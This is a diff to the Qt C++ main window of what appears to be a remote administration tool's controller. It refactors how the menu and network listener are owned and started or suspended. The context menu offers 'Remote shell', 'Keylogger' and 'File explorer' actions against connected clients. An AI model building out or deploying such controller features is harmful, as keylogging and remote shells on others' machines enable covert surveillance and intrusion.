@@ -9,7 +9,9 @@ MainWindow::MainWindow(QWidget *parent)
 {
     ui->setupUi(this);
 
-    _actions = new QMenu;
+    _li = new Listener(ui->listWidget, this);
+
+    _actions = new QMenu(this);
     _actions->addAction(QIcon(":/img/console-ico.png"), tr("Remote shell"), this, [this]{ this->openWindow<ClientShell>(this->_rem_sh); } );
     _actions->addAction(QIcon(":/img/keylog.png"), tr("Keylogger"), this, [this]{ this->openWindow<Keylogs>(this->_out_keys); });
     _actions->addAction(QIcon(":/img/folder.png"), tr("File explorer"), this, [this]{ this->openWindow<Explorer>(this->_explorer); });
@@ -42,11 +44,7 @@ void MainWindow::clearWindows()
 MainWindow::~MainWindow()
 {
     clearWindows();
-    delete _li;
-    _li = nullptr;
     delete ui;
-    delete _actions;
-    _actions = nullptr;
 }
 
 void MainWindow::contextMenu(const QPoint &pos)
@@ -57,8 +55,8 @@ void MainWindow::contextMenu(const QPoint &pos)
 
 void MainWindow::listen()
 {
-    if(_li == nullptr) {
-        _li = new Listener(ui->portListen->value(), ui->listWidget);
+    if(!_li->isListening()) {
+        _li->startListening(ui->portListen->value());
         ui->listenBut->setText(tr("Stop"));
 
         ui->lineEdit->setEnabled(false);
@@ -73,7 +71,6 @@ void MainWindow::listen()
         ui->lineEdit->setEnabled(true);
         ui->portListen->setEnabled(true);
 
-        delete _li;
-        _li = nullptr;
+        _li->suspendListen();
     }
 }
